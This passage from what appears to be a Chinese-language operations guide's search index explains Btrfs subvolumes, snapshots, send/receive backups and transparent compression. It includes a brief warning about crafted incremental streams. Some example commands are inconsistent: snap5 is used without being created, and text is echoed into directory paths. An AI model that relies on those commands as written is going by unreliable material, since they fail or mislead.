\u200b\u4e5f\u200b\u652f\u6301\u200b\u5f15\u7528\u200b\u590d\u5236\u200b\uff08reflink\uff09\u200b\u529f\u80fd\u200b\u3002\u200b\u4f7f\u7528\u200b\u65b9\u6cd5\u200b\u8be6\u89c1\u200b Btrfs \u200b\u7684\u200b\u5f15\u7528\u200b\u590d\u5236\u200b\u4e00\u8282\u200b\u3002</p>"},{"location":"ops/storage/filesystem/#btrfs","title":"Btrfs","text":"<p>\u200b\u5c3d\u7ba1\u200b\u5728\u200b\u6211\u4eec\u200b\u7684\u200b\u5b9e\u8df5\u200b\u4e2d\u200b\uff0c\u200b\u6211\u4eec\u200b\u4e0d\u592a\u200b\u5efa\u8bae\u200b\u4f7f\u7528\u200b Btrfs\u2014\u2014\u200b\u9ad8\u7ea7\u200b\u7279\u6027\u200b\u7528\u4e0d\u4e0a\u200b\uff0c\u200b\u800c\u200b\u8bb8\u591a\u5e74\u200b\u524d\u200b\u5728\u200b\u955c\u50cf\u200b\u7ad9\u4e0a\u200b\u7684\u200b\u6d4b\u8bd5\u8868\u660e\u200b Btrfs \u200b\u5728\u200b\u957f\u65f6\u95f4\u200b\u8fd0\u884c\u200b\u540e\u200b\u5b58\u5728\u200b\u4e25\u91cd\u200b\u7684\u200b\u6027\u80fd\u200b\u95ee\u9898\u200b\u3002 \u200b\u4f46\u662f\u200b\u5728\u200b\u8bb8\u591a\u5e74\u200b\u7684\u200b\u5f00\u53d1\u200b\u540e\u200b\uff0cBtrfs \u200b\u7684\u200b\u7a33\u5b9a\u6027\u200b\u6709\u200b\u4e86\u200b\u5f88\u5927\u200b\u7684\u200b\u63d0\u5347\u200b\uff0c\u200b\u5e76\u4e14\u200b\u4e00\u90e8\u5206\u200b\u7279\u6027\u200b\u5728\u200b\u67d0\u4e9b\u200b\u573a\u5408\u200b\u4e0b\u200b\u5f88\u200b\u6709\u7528\u200b\uff0c\u200b\u56e0\u6b64\u200b\u8fd9\u91cc\u200b\u63d0\u4f9b\u200b\u4e00\u4e9b\u200b\u76f8\u5173\u200b\u7684\u200b\u4ecb\u7ecd\u200b\u3002</p>"},{"location":"ops/storage/filesystem/#btrfs-subvolume","title":"Subvolume","text":"<p>Subvolume \u200b\u662f\u200b Btrfs \u200b\u7684\u200b\u4e00\u4e2a\u200b\u91cd\u8981\u200b\u6982\u5ff5\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u770b\u4f5c\u200b\u662f\u200b Btrfs \u200b\u7684\u200b\u300c\u200b\u5b50\u200b\u6587\u4ef6\u7cfb\u7edf\u200b\u300d\u3002\u200b\u4e0e\u200b\u76ee\u5f55\u200b\u4e0d\u540c\u200b\uff0cSubvolume \u200b\u662f\u200b\u72ec\u7acb\u200b\u7684\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u6709\u200b\u81ea\u5df1\u200b\u7684\u200b\u6302\u8f7d\u200b\u70b9\u200b\u3002 \u200b\u540c\u65f6\u200b subvolume \u200b\u5171\u4eab\u200b\u540c\u4e00\u4e2a\u200b Btrfs \u200b\u6587\u4ef6\u7cfb\u7edf\u200b\u7684\u200b\u7a7a\u95f4\u200b\uff0c\u200b\u4e0d\u200b\u9700\u8981\u200b\u624b\u52a8\u200b\u5206\u914d\u200b\u7a7a\u95f4\u200b\u3002</p> <p>\u200b\u6211\u4eec\u200b\u53ef\u4ee5\u200b\u6765\u200b\u8bd5\u4e00\u8bd5\u200b\uff1a</p> <pre><code>$ truncate -s 8G btrfs.img\n$ sudo mkfs.btrfs btrfs.img\n\uff08\u200b\u8f93\u51fa\u200b\u7701\u7565\u200b\uff09\n$ sudo mount btrfs.img /media/btrfs\n$ sudo btrfs filesystem show /media/btrfs  # \u200b\u53ef\u4ee5\u200b\u4f7f\u7528\u200b btrfs \u200b\u5de5\u5177\u200b\u7ba1\u7406\u200b Btrfs \u200b\u6587\u4ef6\u7cfb\u7edf\u200b\nLabel: none  uuid: 5cdcf4bb-8020-45f9-8dfd-95e04a2a2bc1\n    Total devices 1 FS bytes used 144.00KiB\n    devid    1 size 8.00GiB used 536.00MiB path /dev/loop0\n\n$ # btrfs \u200b\u5de5\u5177\u200b\u4e5f\u200b\u53ef\u4ee5\u200b\u7ba1\u7406\u200b\u79bb\u7ebf\u200b\u7684\u200b btrfs \u200b\u5757\u200b\u8bbe\u5907\u200b\n$ # \u200b\u63a5\u4e0b\u6765\u200b\u521b\u5efa\u200b\u4e00\u4e9b\u200b subvolume\n$ sudo btrfs subvolume create /media/btrfs/subvol1\nCreate subvolume '/media/btrfs/subvol1'\n$ sudo btrfs subvolume create /media/btrfs/subvol2\nCreate subvolume '/media/btrfs/subvol2'\n$ sudo btrfs subvolume create /media/btrfs/subvol3\nCreate subvolume '/media/btrfs/subvol3'\n$ sudo btrfs subvolume list /media/btrfs\nID 256 gen 8 top level 5 path subvol1\nID 257 gen 8 top level 5 path subvol2\nID 258 gen 8 top level 5 path subvol3\n$ ls -lh /media/btrfs  # \u200b\u770b\u8d77\u6765\u200b\u548c\u200b\u666e\u901a\u200b\u76ee\u5f55\u200b\u6ca1\u4ec0\u4e48\u200b\u533a\u522b\u200b\ntotal 0\ndrwxr-xr-x 1 root root 0 Feb 11 14:50 subvol1/\ndrwxr-xr-x 1 root root 0 Feb 11 14:50 subvol2/\ndrwxr-xr-x 1 root root 0 Feb 11 14:50 subvol3/\n$ sudo umount /media/btrfs\n$ sudo mount -o subvol=subvol1 btrfs.img /media/btrfs1  # \u200b\u6302\u8f7d\u200b subvol1\n$ sudo mount -o subvol=subvol2 btrfs.img /media/btrfs2  # \u200b\u6302\u8f7d\u200b subvol2\n$ mount | grep btrfs.img\n/path/to/btrfs.img on /media/btrfs1 type btrfs (rw,relatime,ssd,discard=async,space_cache=v2,subvolid=256,subvol=/subvol1)\n/path/to/btrfs.img on /media/btrfs2 type btrfs (rw,relatime,ssd,discard=async,space_cache=v2,subvolid=257,subvol=/subvol2)\n$ sudo umount /media/btrfs1\n$ sudo umount /media/btrfs2\n</code></pre> <p>\u200b\u5168\u5c40\u200b\u6302\u8f7d\u200b\u53c2\u6570\u200b</p> <p>\u200b\u5927\u90e8\u5206\u200b Btrfs \u200b\u7684\u200b\u6302\u8f7d\u200b\u53c2\u6570\u200b\uff08\u200b\u4f8b\u5982\u200b\u900f\u660e\u200b\u538b\u7f29\u200b\uff09\u200b\u53ea\u200b\u9002\u7528\u200b\u4e8e\u200b\u6574\u4e2a\u200b\u6587\u4ef6\u7cfb\u7edf\u200b\uff0c\u200b\u5728\u200b\u9996\u4e2a\u200b subvolume \u200b\u4e0a\u200b\u6302\u8f7d\u200b\u65f6\u200b\uff0c\u200b\u8fd9\u4e9b\u200b\u53c2\u6570\u200b\u4f1a\u200b\u88ab\u200b\u5e94\u7528\u200b\u5230\u200b\u6574\u4e2a\u200b\u6587\u4ef6\u7cfb\u7edf\u200b\u3002 \u200b\u540e\u7eed\u200b\u6302\u8f7d\u200b\u4f7f\u7528\u200b\u7684\u200b\u53c2\u6570\u200b\u4f1a\u200b\u88ab\u200b\u5ffd\u7565\u200b\u3002</p> <p>\u200b\u5728\u200b Btrfs \u200b\u6302\u8f7d\u200b\u53c2\u6570\u200b\u4e2d\u200b\uff0c<code>subvol=&lt;path&gt;</code> \u200b\u548c\u200b <code>subvolid=&lt;id&gt;</code> \u200b\u7528\u6765\u200b\u6807\u8bc6\u200b\u9700\u8981\u200b\u6302\u8f7d\u200b\u7684\u200b subvolume\u3002\u200b\u5982\u679c\u200b\u4e24\u4e2a\u200b\u53c2\u6570\u200b\u90fd\u200b\u4e0d\u200b\u6307\u5b9a\u200b\uff0c\u200b\u5219\u200b\u4f1a\u200b\u6302\u8f7d\u200b\u9ed8\u8ba4\u200b subvolume\u3002</p> <pre><code>$ sudo mount btrfs.img /media/btrfs # \u200b\u6302\u8f7d\u200b\u6574\u4e2a\u200b\u6587\u4ef6\u7cfb\u7edf\u200b\n$ sudo btrfs subvolume create /media/btrfs/subvol1/nestedvol1  # \u200b\u521b\u5efa\u200b\u5d4c\u5957\u200b\u7684\u200b subvolume\nCreate subvolume '/media/btrfs/subvol1/nestedvol1'\n$ # \u200b\u5c06\u200b subvolume \u200b\u8bbe\u7f6e\u200b\u4e3a\u200b\u9ed8\u8ba4\u200b\n$ sudo btrfs subvolume set-default /media/btrfs/subvol1/nestedvol1\n$ sudo btrfs subvolume get-default /media/btrfs\nID 259 gen 11 top level 256 path subvol1/nestedvol1\n$ sudo umount /media/btrfs\n$ # \u200b\u91cd\u65b0\u200b\u6302\u8f7d\u200b\u6587\u4ef6\u7cfb\u7edf\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u770b\u5230\u200b\u6302\u8f7d\u200b\u7684\u200b subvolume \u200b\u5df2\u7ecf\u200b\u6539\u53d8\u200b\n$ sudo mount btrfs.img /media/btrfs  \n$ sudo btrfs subvolume show /media/btrfs\nsubvol1/nestedvol1\n    Name:           nestedvol1\n\uff08\u200b\u4ee5\u4e0b\u200b\u8f93\u51fa\u200b\u7701\u7565\u200b\uff09\n$ sudo umount /media/btrfs\n$ # \u200b\u91cd\u65b0\u200b\u6302\u8f7d\u200b\u6587\u4ef6\u7cfb\u7edf\u200b\uff0c\u200b\u6307\u5b9a\u200b\u6302\u8f7d\u200b\u6839\u200b subvolume\uff08ID=5\uff09\n$ sudo mount -o subvolid=5 btrfs.img /media/btrfs\n$ sudo btrfs subvolume show /media/btrfs\n/\n    Name:           &lt;FS_TREE&gt;\n\uff08\u200b\u4ee5\u4e0b\u200b\u8f93\u51fa\u200b\u7701\u7565\u200b\uff09\n$ sudo umount /media/btrfs\n</code></pre>"},{"location":"ops/storage/filesystem/#btrfs-snapshot","title":"\u5feb\u7167","text":"<p>\u200b\u5728\u200b subvolume \u200b\u7684\u200b\u57fa\u7840\u200b\u4e0a\u200b\uff0cBtrfs \u200b\u652f\u6301\u200b\u4e86\u200b\u5feb\u7167\u200b\u529f\u80fd\u200b\u3002\u200b\u8fd9\u91cc\u200b\u7684\u200b\u5feb\u7167\u200b\u53ef\u80fd\u200b\u4e0e\u200b\u6211\u4eec\u200b\u719f\u6089\u200b\u7684\u200b\u300c\u200b\u5feb\u7167\u200b\u300d\uff08\u200b\u4f8b\u5982\u200b\u865a\u62df\u673a\u200b\u8f6f\u4ef6\u200b\u7684\u200b\u5feb\u7167\u200b\u529f\u80fd\u200b\uff09\u200b\u6709\u6240\u4e0d\u540c\u200b\uff0c\u200b\u5b83\u200b\u672c\u8d28\u200b\u4e0a\u200b\u5c31\u662f\u200b\u548c\u200b\u5176\u4ed6\u200b subvolume \u200b\u5171\u4eab\u200b\u6570\u636e\u200b\u7684\u200b subvolume\u3002\u200b\u8ba9\u200b\u6211\u4eec\u200b\u8bd5\u4e00\u8bd5\u200b\u5427\u200b\uff1a</p> <pre><code>$ sudo mount -o subvolid=5 btrfs.img /media/btrfs  # \u200b\u6302\u8f7d\u200b\u6574\u4e2a\u200b\u6587\u4ef6\u7cfb\u7edf\u200b\n$ echo \"test1\" &gt; /media/btrfs/subvol1/test  # \u200b\u53ef\u80fd\u200b\u9700\u8981\u200b root \u200b\u6743\u9650\u200b\n$ sudo btrfs subvolume snapshot /media/btrfs/subvol1 /media/btrfs/snap1  # \u200b\u521b\u5efa\u200b\u5feb\u7167\u200b\nCreate a snapshot of '/media/btrfs/subvol1/' in '/media/btrfs/snap1'\n$ # \u200b\u6b64\u65f6\u200b snap1 \u200b\u548c\u200b subvol1 \u200b\u5171\u4eab\u200b\u6570\u636e\u200b\u2014\u2014\u200b\u5b58\u50a8\u200b\u7684\u200b\u662f\u200b\u76ee\u524d\u200b subvol1 \u200b\u7684\u200b\u5185\u5bb9\u200b\n$ cat /media/btrfs/snap1/test\ntest1\n$ echo \"test2\" &gt; /media/btrfs/subvol1/test  # \u200b\u4fee\u6539\u200b subvol1\n$ cat /media/btrfs/snap1/test  # snap1 \u200b\u4e0d\u200b\u53d7\u200b\u5f71\u54cd\u200b\ntest1\n$ echo \"test3\" &gt; /media/btrfs/snap1/test  # \u200b\u4fee\u6539\u200b snap1\n$ cat /media/btrfs/subvol1/test  # subvol1 \u200b\u4e0d\u200b\u53d7\u200b\u5f71\u54cd\u200b\ntest2\n$ sudo btrfs subvolume delete /media/btrfs/snap1  # \u200b\u5220\u9664\u200b\u5feb\u7167\u200b\nDelete subvolume 259 (no-commit): '/media/btrfs/snap1'\n$ sudo umount /media/btrfs\n</code></pre> <p>\u200b\u8fd9\u91cc\u200b\u6211\u4eec\u200b\u53ef\u4ee5\u200b\u4fee\u6539\u200b\u300c\u200b\u5feb\u7167\u200b\u300d\u200b\u7684\u200b\u5185\u5bb9\u200b\uff0c\u200b\u5728\u200b CoW \u200b\u6587\u4ef6\u7cfb\u7edf\u200b\u4e2d\u200b\uff0c\u200b\u4fee\u6539\u200b\u5171\u4eab\u200b\u7684\u200b\u5185\u5bb9\u200b\u4f1a\u200b\u88ab\u200b\u590d\u5236\u200b\uff0c\u200b\u800c\u200b\u672a\u4fee\u6539\u200b\u7684\u200b\u5185\u5bb9\u200b\u4f1a\u200b\u88ab\u200b\u5171\u4eab\u200b\u3002 \u200b\u4e0d\u8fc7\u200b\u5f88\u591a\u200b\u65f6\u5019\u200b\u6211\u4eec\u200b\u4e0d\u200b\u5e0c\u671b\u200b\u5feb\u7167\u200b\u53ef\u200b\u5199\u200b\uff0c\u200b\u5728\u200b\u521b\u5efa\u200b\u5feb\u7167\u200b\u65f6\u200b\u53ef\u4ee5\u200b\u52a0\u4e0a\u200b <code>-r</code> \u200b\u53c2\u6570\u200b\u3002</p> <p>\u200b\u548c\u200b <code>cp</code> \u200b\u547d\u4ee4\u200b\u7c7b\u4f3c\u200b\u5730\u200b\uff0c\u200b\u5f53\u200b\u5feb\u7167\u200b\u7684\u200b\u76ee\u6807\u200b\u8def\u5f84\u200b\u662f\u200b\u4e00\u4e2a\u200b\u76ee\u5f55\u200b\u65f6\u200b\uff0cBtrfs \u200b\u5de5\u5177\u200b\u5c06\u200b\u5728\u200b\u8be5\u200b\u76ee\u5f55\u200b\u4e0b\u200b\u4e00\u4e2a\u200b\u521b\u5efa\u200b\u540c\u540d\u200b\u7684\u200b subvolume\u3002</p> <pre><code>$ sudo mount -o subvolid=5 btrfs.img /media/btrfs  # \u200b\u6302\u8f7d\u200b\u6574\u4e2a\u200b\u6587\u4ef6\u7cfb\u7edf\u200b\n$ sudo mkdir /media/btrfs/snapshots  # \u200b\u521b\u5efa\u200b snapshots \u200b\u76ee\u5f55\u200b\n$ sudo btrfs subvolume snapshot -r /media/btrfs/subvol1 /media/btrfs/snapshots  # \u200b\u521b\u5efa\u200b\u53ea\u8bfb\u200b\u5feb\u7167\u200b\nCreate a readonly snapshot of '/media/btrfs/subvol1/' in '/media/btrfs/snapshots/subvol1'\n$ sudo btrfs property get /media/btrfs/snapshots/subvol1  # \u200b\u9a8c\u8bc1\u200b\u53ea\u8bfb\u200b\u5c5e\u6027\u200b\nro=true\n$ sudo mkdir /media/btrfs/recovered  # \u200b\u521b\u5efa\u200b recovered \u200b\u76ee\u5f55\u200b\n$ sudo btrfs subvolume snapshot /media/btrfs/snapshots/subvol1 /media/btrfs/recovered  # \u200b\u8fd8\u539f\u200b\u5feb\u7167\u200b\nCreate a snapshot of '/media/btrfs/snapshots/subvol1' in '/media/btrfs/recovered/subvol1'\n$ sudo btrfs property set /media/btrfs/recovered/subvol1 ro false  # \u200b\u5c06\u200b\u8fd8\u539f\u200b\u7684\u200b subvolume \u200b\u8bbe\u7f6e\u200b\u4e3a\u200b\u53ef\u200b\u5199\u200b\n$ echo \"test4\" &gt; /media/btrfs/recovered/subvol1  # \u200b\u4fee\u6539\u200b\u8fd8\u539f\u200b\u7684\u200b subvol1\n$ sudo umount /media/btrfs\n</code></pre> <p>\u200b\u5d4c\u5957\u200b subvolume</p> <p>\u200b\u867d\u7136\u200b\u5d4c\u5957\u200b subvolume \u200b\u5728\u200b\u76ee\u5f55\u200b\u6811\u4e2d\u200b\u770b\u4e0a\u53bb\u200b\u662f\u200b\u4e0a\u7ea7\u200b subvolume \u200b\u7684\u200b\u4e00\u90e8\u5206\u200b\uff0c\u200b\u4f46\u200b\u5b83\u200b\u5e76\u200b\u4e0d\u662f\u200b\u4e0a\u7ea7\u200b subvolume \u200b\u7684\u200b\u6587\u4ef6\u200b\uff0c\u200b\u56e0\u6b64\u200b\u4e0d\u4f1a\u200b\u88ab\u200b\u5305\u62ec\u200b\u5728\u200b\u5feb\u7167\u200b\u4e2d\u200b\uff0c\u200b\u53ea\u4f1a\u200b\u4fdd\u7559\u200b\u4f5c\u4e3a\u200b\u6302\u8f7d\u200b\u70b9\u200b\u7684\u200b\u7a7a\u76ee\u5f55\u200b\u3002</p> <p>\u200b\u6211\u4eec\u200b\u53ef\u4ee5\u200b\u5b9a\u65f6\u200b\u6267\u884c\u200b\u5feb\u7167\u200b\uff0c\u200b\u4ee5\u4fbf\u200b\u5728\u200b\u6587\u4ef6\u200b\u88ab\u200b\u8bef\u64cd\u4f5c\u200b\u65f6\u200b\u80fd\u591f\u200b\u6062\u590d\u200b\u3002\u200b\u4f8b\u5982\u200b snapper \u200b\u7b49\u200b\u8f6f\u4ef6\u200b\u53ef\u4ee5\u200b\u5728\u200b\u540e\u53f0\u200b\u81ea\u52a8\u200b\u6267\u884c\u200b\u5feb\u7167\u200b\u4efb\u52a1\u200b\u3002</p>"},{"location":"ops/storage/filesystem/#btrfs-send","title":"\u4f20\u8f93","text":"<p>Btrfs \u200b\u652f\u6301\u200b\u6587\u4ef6\u7cfb\u7edf\u200b\u5c42\u9762\u200b\u7684\u200b\u6d41\u5f0f\u200b\u53d1\u9001\u200b\u548c\u200b\u63a5\u6536\u200b\uff0c\u200b\u5141\u8bb8\u200b\u4ee5\u200b\u5b57\u8282\u200b\u6d41\u200b\u7684\u200b\u5f62\u5f0f\u200b\u5c06\u200b\u4e00\u4e2a\u200b\u53ea\u8bfb\u200b subvolume\uff08\u200b\u4ee5\u4e0b\u200b\u7b80\u79f0\u200b\u5feb\u7167\u200b\uff09\u200b\u7684\u200b\u5185\u5bb9\u200b\u62f7\u8d1d\u5230\u200b\u53e6\u200b\u4e00\u4e2a\u200b\u6587\u4ef6\u7cfb\u7edf\u200b\u4e0a\u200b\uff0c\u200b\u6bd4\u5982\u200b\u4e0b\u9762\u200b\u8fd9\u6837\u200b\uff1a</p> <pre><code>$ sudo mount -o subvolid=5 btrfs.img /media/btrfs  # \u200b\u6302\u8f7d\u200b\u6574\u4e2a\u200b\u6587\u4ef6\u7cfb\u7edf\u200b\n$ sudo btrfs subvolume snapshot -r /media/btrfs/subvol1 /media/btrfs/snap2  # \u200b\u521b\u5efa\u200b\u53ea\u8bfb\u200b\u5feb\u7167\u200b\nCreate a readonly snapshot of '/media/btrfs/subvol1' in '/media/btrfs/snap2'\n$ # \u200b\u521b\u5efa\u200b\u5e76\u200b\u6302\u8f7d\u200b\u65b0\u200b\u6587\u4ef6\u7cfb\u7edf\u200b\n$ truncate -s 8G btrfs-alt.img\n$ sudo mkfs.btrfs btrfs-alt.img\n\uff08\u200b\u8f93\u51fa\u200b\u7701\u7565\u200b\uff09\n$ sudo mount btrfs-alt.img /media/btrfs-alt\n$ # \u200b\u5c06\u200b snap2 \u200b\u53d1\u9001\u5230\u200b\u65b0\u200b\u7684\u200b\u6587\u4ef6\u7cfb\u7edf\u200b\n$ sudo btrfs send /media/btrfs/snap2 | sudo btrfs receive /media/btrfs-alt/subvol1\nAt subvol /media/btrfs/snap2\nAt subvol subvol1\n$ sudo btrfs subvolume ls /media/btrfs-alt\nID 256 gen 11 top level 5 path subvol1\n$ sudo umount /media/btrfs\n$ sudo umount /media/btrfs-alt\n</code></pre> <p>\u200b\u901a\u8fc7\u200b\u7ba1\u9053\u200b\u4f20\u8f93\u200b\uff0cBtrfs \u200b\u7684\u200b\u6d41\u5f0f\u200b\u4f20\u8f93\u200b\u529f\u80fd\u200b\u5927\u5927\u7b80\u5316\u200b\u4e86\u200b\u4e0d\u540c\u200b\u78c1\u76d8\u200b\u3001\u200b\u6587\u4ef6\u7cfb\u7edf\u200b\u751a\u81f3\u200b\u670d\u52a1\u5668\u4e4b\u95f4\u200b\u7684\u200b\u6587\u4ef6\u7cfb\u7edf\u200b\u5907\u4efd\u200b\u548c\u200b\u8fc1\u79fb\u200b\u3002</p> <pre><code>$ sudo mount -o subvolid=5 btrfs.img /media/btrfs  # \u200b\u6302\u8f7d\u200b\u6574\u4e2a\u200b\u6587\u4ef6\u7cfb\u7edf\u200b\n$ sudo btrfs subvolume snapshot -r /media/btrfs/subvol1 /media/btrfs/snap3\nCreate a readonly snapshot of '/media/btrfs/subvol1' in '/media/btrfs/snap3'\n$ # \u200b\u5907\u4efd\u200b\u5230\u200b\u5176\u5b83\u200b\u6587\u4ef6\u7cfb\u7edf\u200b\uff0c\u200b\u8fd9\u91cc\u200b\u4ee5\u200b NFS \u200b\u4e3a\u4f8b\u200b\n$ sudo btrfs send /media/btrfs/snap3 -f /mnt/nfs/btrfs/subvol1  # \u200b\u5c06\u200b\u5feb\u7167\u200b\u5bfc\u51fa\u200b\u4e3a\u200b\u6587\u4ef6\u200b\nAt subvol /media/btrfs/snap3\n$ sudo btrfs receive /media/btrfs/snap1 -f /mnt/nfs/btrfs/subvol1  # \u200b\u5728\u200b\u53e6\u4e00\u53f0\u200b\u5171\u4eab\u200b\u5b58\u50a8\u200b\u7684\u200b\u670d\u52a1\u5668\u200b\u4e0a\u200b\u8fd8\u539f\u200b\nAt subvol snap1\n$ # \u200b\u901a\u8fc7\u200b SSH \u200b\u538b\u7f29\u200b\u4f20\u8f93\u200b\u5230\u200b\u53e6\u4e00\u53f0\u200b\u670d\u52a1\u5668\u200b\uff0c\u200b\u9700\u8981\u200b\u5b89\u88c5\u200b lz4\n$ sudo btrfs send /media/btrfs/snap3 | lz4 | ssh another-server \"lz4 -d | sudo btrfs receive /media/btrfs/snap1\"\nAt subvol /media/btrfs/snap3\nAt subvol snap1\n$ sudo umount /media/btrfs\n</code></pre> <p>Btrfs \u200b\u8fd8\u200b\u652f\u6301\u200b\u589e\u91cf\u200b\u5907\u4efd\u200b/\u200b\u4f20\u8f93\u200b\u3002\u200b\u589e\u91cf\u200b\u4f20\u8f93\u200b\u9700\u8981\u200b\u4fdd\u8bc1\u200b\u5728\u200b\u76ee\u6807\u200b\u8def\u5f84\u200b\u4e0b\u200b\u5b58\u5728\u200b\u4e0e\u200b\u6e90\u6587\u4ef6\u200b\u7cfb\u7edf\u200b\u4e0a\u200b\u540c\u540d\u200b\u4e14\u200b\u5185\u5bb9\u200b\u5b8c\u5168\u4e00\u81f4\u200b\u7684\u200b\u5feb\u7167\u200b\uff0cBtrfs \u200b\u53ef\u4ee5\u200b\u81ea\u52a8\u200b\u8ba1\u7b97\u200b\u5e76\u200b\u4f20\u8f93\u200b\u4e24\u4e2a\u200b\u5feb\u7167\u200b\u7684\u200b\u5dee\u5f02\u200b\u90e8\u5206\u200b\u3002</p> <pre><code>$ sudo mount -o subvolid=5 btrfs.img /media/btrfs  # \u200b\u6302\u8f7d\u200b\u6574\u4e2a\u200b\u6587\u4ef6\u7cfb\u7edf\u200b\n$ sudo mount btrfs-alt.img /media/btrfs-alt  # \u200b\u6302\u8f7d\u200b\u53e6\u200b\u4e00\u4e2a\u200b\u6587\u4ef6\u7cfb\u7edf\u200b\n$ sudo btrfs subvolume snapshot -r /media/btrfs/subvol1 /media/btrfs/snap4  # \u200b\u521b\u5efa\u200b\u53ea\u8bfb\u200b\u5feb\u7167\u200b\n$ # \u200b\u5c06\u200b snap4 \u200b\u53d1\u9001\u5230\u200b\u53e6\u200b\u4e00\u4e2a\u200b\u6587\u4ef6\u7cfb\u7edf\u200b\n$ sudo btrfs send /media/btrfs/snap4 | sudo btrfs receive /media/btrfs-alt\nAt subvol /media/btrfs/snap4\nAt subvol snap4\n$ echo \"test5\" &gt; /media/btrfs/subvol1  # \u200b\u4fee\u6539\u200b subvol1\n$ sudo btrfs subvolume snapshot -r /media/btrfs/subvol1 /media/btrfs/snap4  # \u200b\u521b\u5efa\u200b\u65b0\u200b\u7684\u200b\u53ea\u8bfb\u200b\u5feb\u7167\u200b\n$ # \u200b\u67e5\u770b\u200b snap5 \u200b\u76f8\u5bf9\u200b\u4e8e\u200b snap4 \u200b\u7684\u200b\u53d8\u5316\u200b\n$ sudo btrfs send /media/btrfs/snap5 -p /media/btrfs/snap4 | sudo btrfs receive --dump\n$ # \u200b\u5c06\u200b snap5 \u200b\u589e\u91cf\u200b\u53d1\u9001\u5230\u200b\u53e6\u200b\u4e00\u4e2a\u200b\u6587\u4ef6\u7cfb\u7edf\u200b\n$ sudo btrfs send /media/btrfs/snap5 -p /media/btrfs/snap4 | sudo btrfs receive /media/btrfs-alt\nAt subvol /media/btrfs/snap5\nAt subvol snap5\n$ sudo umount /media/btrfs\n$ sudo umount /media/btrfs-alt\n</code></pre> <p>\u200b\u7f51\u7edc\u5b89\u5168\u200b\u98ce\u9669\u200b</p> <p>Btrfs \u200b\u5de5\u5177\u200b\u76ee\u524d\u200b\u4e0d\u4f1a\u200b\u5145\u5206\u200b\u9a8c\u8bc1\u200b\u589e\u91cf\u200b\u4f20\u8f93\u6d41\u200b\u7684\u200b\u53ef\u9760\u6027\u200b\uff0c\u200b\u653b\u51fb\u8005\u200b\u53ef\u4ee5\u200b\u901a\u8fc7\u200b\u7cbe\u5fc3\u200b\u6784\u9020\u200b Btrfs \u200b\u6d41\u200b\u4f7f\u5f97\u200b\u521b\u5efa\u200b\u7684\u200b\u5feb\u7167\u200b\u4e2d\u200b\u5305\u62ec\u200b\u76ee\u6807\u200b\u6587\u4ef6\u7cfb\u7edf\u200b\u4e2d\u200b\u7684\u200b\u4efb\u610f\u200b\u6587\u4ef6\u200b\u3002 \u200b\u5728\u200b\u901a\u8fc7\u200b\u7f51\u7edc\u200b\u63a5\u6536\u200b Btrfs \u200b\u6d41\u200b\u65f6\u200b\uff0c\u200b\u5e94\u8be5\u200b\u9996\u5148\u200b\u786e\u4fdd\u200b\u4f20\u8f93\u200b\u6765\u6e90\u200b\u548c\u200b\u4f20\u8f93\u200b\u94fe\u8def\u200b\u7684\u200b\u5b89\u5168\u6027\u200b\u3001\u200b\u53ef\u9760\u6027\u200b\uff0c\u200b\u9632\u8303\u200b\u6f5c\u5728\u200b\u7684\u200b\u7f51\u7edc\u5b89\u5168\u200b\u653b\u51fb\u200b\u98ce\u9669\u200b\u3002</p>"},{"location":"ops/storage/filesystem/#btrfs-compression","title":"\u900f\u660e\u200b\u538b\u7f29","text":"<p>Btrfs \u200b\u652f\u6301\u200b\u900f\u660e\u200b\u538b\u7f29\u200b\uff0c\u200b\u6587\u4ef6\u7cfb\u7edf\u200b\u4f1a\u200b\u81ea\u52a8\u200b\u538b\u7f29\u6587\u4ef6\u200b\uff0c\u200b\u800c\u200b\u4e0a\u5c42\u200b\u7684\u200b\u5e94\u7528\u7a0b\u5e8f\u200b\u4e0d\u200b\u9700\u8981\u200b\u5173\u5fc3\u200b\u8fd9\u4e00\u200b\u8fc7\u7a0b\u200b\u3002 \u200b\u8fd9\u200b\u4e5f\u200b\u662f\u200b\u8bb8\u591a\u200b Btrfs \u200b\u7528\u6237\u200b\u4f1a\u200b\u5f00\u542f\u200b\u7684\u200b\u6302\u8f7d\u200b\u9009\u9879\u200b\u3002 Zstd \u200b\u538b\u7f29\u7b97\u6cd5\u200b\u517c\u987e\u200b\u4e86\u200b\u6027\u80fd\u200b\u4e0e\u200b\u538b\u7f29\u200b\u6548\u7387\u200b\uff0c\u200b\u662f\u200b\u8bb8\u591a\u200b\u7528\u6237\u200b\u7684\u200b\u9009\u62e9\u200b\u3002</p> <p>\u200b\u4ee5\u4e0b\u200b\u662f\u200b\u4e00\u4e2a\u200b\u542f\u7528\u200b\u4e86\u200b Btrfs \u200b\u900f\u660e\u200b\u538b\u7f29\u200b\uff08<code>compress=zstd:3</code>\uff09\u200b\u7684\u200b\u684c\u9762\u200b\u7528\u6237\u200b\uff0c\u200b\u5728\u200b <code>/home</code> \u200b\u8fd9\u4e2a\u200b subvolume \u200b\u4e0b\u200b\u7684\u200b\u4f8b\u5b50\u200b\uff1a</p> <pre><code>$ sudo compsize /home\nProcessed 4429337 files, 5827189 regular extents (6428918 refs), 2327200 inline.\nType       Perc     Disk Usage   Uncompressed Referenced  \nTOTAL       78%     1017G         1.2T         1.3T       \nnone       100%      911G         911G         918G       \nzstd        27%      105G         384G         413G       \nprealloc   100%      643M         643M         1.0G\n</code></pre> <p>\u200b\u53ef\u4ee5\u200b\u770b\u5230\u200b\uff0c\u200b\u900f\u660e\u200b\u538b\u7f29\u200b\u7279\u6027\u200b\u4e3a\u200b\u8be5\u200b\u7528\u6237\u200b\u8282\u7701\u200b\u4e86\u200b 200G \u200b\u7684\u200b\u78c1\u76d8\u7a7a\u95f4\u200b\u3002</p>"},{"location":"ops/storage/filesystem/#btrfs-reflink","title":"\u5f15\u7528\u200b\u590d\u5236","text":"<p>Btrfs 